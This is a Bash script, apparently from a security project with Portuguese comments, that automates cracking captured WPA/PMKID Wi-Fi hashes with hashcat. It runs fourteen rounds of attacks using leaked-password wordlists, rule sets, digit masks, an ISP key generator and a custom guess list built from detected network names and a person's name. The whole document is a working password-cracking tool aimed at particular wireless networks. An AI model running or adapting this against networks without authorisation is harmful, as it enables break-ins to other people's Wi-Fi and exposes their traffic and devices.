#!/usr/bin/env bash
# crack_all.sh v3 — Crack definitivo com dictstat reset e status real
export LD_LIBRARY_PATH=/usr/lib/wsl/lib
HC=hashcat
H=/tmp/pmkid_hashes.txt
WL=/mnt/d/Projetos-SafeLabs/submodules/Wordlists
RULES=/usr/share/hashcat/rules
WFH=$WL/WordListsForHacking/wfh.py
OUT=/tmp/wxf_final
DICTSTAT=~/.local/share/hashcat/hashcat.dictstat2
mkdir -p $OUT

GRN='\033[32m'; NC='\033[0m'
HC_DIR=~/.local/share/hashcat

banner() { echo ""; echo "======================================"; echo "  $1"; echo "======================================"; }

# Wrapper: mata instâncias prévias, limpa PIDs/dictstat, force-run
hc_run() {
    pkill -9 hashcat 2>/dev/null; sleep 0.5
    rm -f "$HC_DIR"/*.pid "$HC_DIR"/*.restore "$HC_DIR"/*.dictstat2 2>/dev/null
    $HC -m 22000 $H "$@" --force --restore-disable 2>&1 | \
        grep -E "Speed|Recovered|Progress|Exhausted|Paused|Candidate|Started|Stopped|Found" | head -15
    return ${PIPESTATUS[0]}
}

check() {
    FOUND=$($HC -m 22000 $H --show 2>/dev/null | grep -v "^$")
    if [ -n "$FOUND" ]; then
        echo -e "${GRN}*** CRACKED: $FOUND ***${NC}"
        echo "$FOUND" >> $OUT/CRACKED.txt
        return 0
    fi
    return 1
}

banner "CRACK SESSION v3 — $(date)"
echo "GPU: $(nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null)"
echo "Hashes: $(wc -l < $H) | Potfile: $(cat ~/.local/share/hashcat/hashcat.potfile 2>/dev/null | wc -l) crackeados"

banner "R1: SecLists WiFi-WPA top4800"
hc_run $WL/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt \
    --status --status-timer=5
check && exit 0

banner "R2: Default creds IoT/Router"
hc_run $WL/WordListsForHacking/passwords/default-creds-combo.lst
check && exit 0

banner "R3: wlist_brasil 55MB"
hc_run $WL/WordListsForHacking/passwords/wlist_brasil.lst \
    --status --status-timer=15
check && exit 0

banner "R4: rockyou + best64.rule"
hc_run /tmp/rockyou.txt -r $RULES/best64.rule \
    --status --status-timer=20
check && exit 0

banner "R5: rockyou + d3ad0ne.rule"
hc_run /tmp/rockyou.txt -r $RULES/d3ad0ne.rule \
    --status --status-timer=20
check && exit 0

banner "R6: wlist_brasil + best64 (max 10min)"
hc_run $WL/WordListsForHacking/passwords/wlist_brasil.lst \
    -r $RULES/best64.rule --runtime 600 --status --status-timer=30
check && exit 0

banner "R7: Keyboard walks 200k"
if [ ! -f $OUT/kwalk.lst ]; then
    echo "  Gerando kwalk..."; python3 $WFH kwalk --min-len 8 --max-len 12 --limit 200000 -o $OUT/kwalk.lst 2>/dev/null
fi
echo "  kwalk: $(wc -l < $OUT/kwalk.lst) entradas"
hc_run $OUT/kwalk.lst
check && exit 0

banner "R8: Máscara ?d×8 (8 dígitos)"
hc_run -a 3 '?d?d?d?d?d?d?d?d' --status --status-timer=10
check && exit 0

banner "R9: Máscara ?d×9 (9 dígitos)"
hc_run -a 3 '?d?d?d?d?d?d?d?d?d' --status --status-timer=10
check && exit 0

banner "R10: Máscara ?d×10 (10 dígitos)"
hc_run -a 3 '?d?d?d?d?d?d?d?d?d?d' --status --status-timer=10
check && exit 0

banner "R11: ISP keygen 200k"
if [ ! -f $OUT/isp.lst ]; then
    echo "  Gerando ISP keygen..."; python3 $WFH isp-keygen --isp xfinity_comcast --limit 200000 -o $OUT/isp.lst 2>/dev/null
fi
echo "  ISP: $(wc -l < $OUT/isp.lst) entradas"
hc_run $OUT/isp.lst
check && exit 0

banner "R12: Mangle WiFi-WPA leet+toggle"
if [ ! -f $OUT/mangle.lst ]; then
    echo "  Gerando mangle..."; python3 $WFH mangle \
        --wordlist $WL/SecLists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt \
        --limit 80000 -o $OUT/mangle.lst 2>/dev/null
fi
echo "  mangle: $(wc -l < $OUT/mangle.lst) entradas"
hc_run $OUT/mangle.lst
check && exit 0

banner "R13: Perfil SSID (nomes detectados) + rules"
cat > $OUT/ssid.lst << 'EOF'
UniaoGeek
UniaoGeek123
UniaoGeek2024
UniaoGeek2025
UniaoGeek2026
UniaoGeek!
uniaogeek
uniaogeek123
UNIAOGEEK
Denise123
denise123
Denise2024
NET2024
claro123
claro2024
vivo2024
internet123
wifi1234
senha1234
12345678
EOF
if [ ! -f $OUT/ssid_all.lst ]; then
    python3 $WFH mangle --wordlist $OUT/ssid.lst -o $OUT/ssid_mangle.lst 2>/dev/null || cp $OUT/ssid.lst $OUT/ssid_mangle.lst
    cat $OUT/ssid.lst $OUT/ssid_mangle.lst | sort -u > $OUT/ssid_all.lst
fi
echo "  ssid+mangle: $(wc -l < $OUT/ssid_all.lst) entradas"
hc_run $OUT/ssid_all.lst
hc_run $OUT/ssid_all.lst -r $RULES/best64.rule
hc_run $OUT/ssid_all.lst -r $RULES/d3ad0ne.rule
check && exit 0

banner "R14: Máscara ?l×4+?d×4 (max 30min GPU)"
hc_run -a 3 '?l?l?l?l?d?d?d?d' --runtime 1800 --status --status-timer=60
check && exit 0

banner "RESULTADO FINAL — $(date)"
FINAL=$($HC -m 22000 $H --show 2>/dev/null | grep -v "^$")
if [ -n "$FINAL" ]; then
    echo -e "${GRN}*** SENHAS ENCONTRADAS ***${NC}"
    echo "$FINAL"
    echo "$FINAL" > $OUT/CRACKED.txt
else
    echo "Nenhuma senha encontrada em 14 rodadas."
    echo "Conclusão: Senhas são FORTES — não estão em wordlists conhecidas."
fi
ls -lh $OUT/
